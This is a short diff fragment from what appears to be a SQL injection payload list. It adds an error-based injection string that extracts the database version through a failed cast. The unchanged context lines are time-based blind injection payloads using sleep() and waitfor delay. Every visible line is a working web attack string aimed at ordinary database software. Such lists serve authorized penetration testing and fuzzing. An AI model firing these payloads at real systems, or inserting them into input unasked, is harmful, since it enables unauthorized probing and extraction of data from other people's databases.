@@ -103,3 +103,4 @@ if(now()=sysdate(),sleep(20),0)
 `'; waitfor delay '0:0:6' -- `
 'XOR(if(now()=sysdate(),sleep(33),0))OR'
 >';WAITFOR DELAY '00:00:5'--
+' AND 1=CAST((SELECT version()) AS int) --
